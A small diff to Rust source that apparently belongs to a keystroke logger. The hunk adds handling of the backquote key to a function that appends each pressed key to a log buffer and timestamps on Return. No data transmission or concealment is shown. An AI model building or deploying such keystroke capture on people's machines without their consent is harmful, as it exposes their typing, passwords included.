@@ -153,6 +153,10 @@ fn track(event: Event) {
             *LOG_FILE.lock().unwrap() += "\\";
             *LOGGED.lock().unwrap() = false;
         },
+        EventType::KeyPress(Key::BackQuote) => {
+            *LOG_FILE.lock().unwrap() += "`";
+            *LOGGED.lock().unwrap() = false;
+        },
         EventType::KeyPress(Key::Return) => {
             let now = Utc::now();
             let x: String = format!("{}", now);
